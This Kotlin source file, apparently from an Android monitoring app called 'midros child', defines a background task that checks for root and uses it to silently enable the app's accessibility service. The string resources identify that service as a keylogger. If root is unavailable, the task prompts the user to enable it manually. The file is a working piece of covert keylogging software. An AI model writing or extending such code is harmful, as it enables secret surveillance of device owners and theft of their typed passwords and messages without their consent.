package com.github.midros.child.utils

import android.annotation.SuppressLint
import android.app.ProgressDialog
import android.content.Context
import android.os.AsyncTask
import com.github.midros.child.R
import com.github.midros.child.utils.ConstFun.enableAccessibility
import com.github.midros.child.utils.ConstFun.isRootAvailable
import com.github.midros.child.utils.ConstFun.alertDialog
import com.github.midros.child.utils.ConstFun.openAccessibilitySettings
import com.pawegio.kandroid.indeterminateProgressDialog
import com.pawegio.kandroid.longToast

/**
 * Created by luis rafael on 18/03/18.
 */
@SuppressLint("StaticFieldLeak")
class AsyncTaskEnableAccessibility(private val context: Context) : AsyncTask<Void, Boolean, Boolean>() {

    private lateinit var progressDialog: ProgressDialog

    override fun onPreExecute() {
        super.onPreExecute()
        progressDialog = context.indeterminateProgressDialog(R.string.checking_root){setCancelable(false)}
    }

    override fun doInBackground(vararg params: Void?): Boolean {
        if (isRootAvailable()) return enableAccessibility()
        return false
    }

    override fun onPostExecute(result: Boolean) {
        super.onPostExecute(result)
        progressDialog.dismiss()
        if (result) context.longToast(R.string.enable_keylogger_success)
        else
            context.alertDialog(R.string.msg_dialog_enable_keylogger,android.R.string.ok,true){
                context.openAccessibilitySettings()
            }

    }

}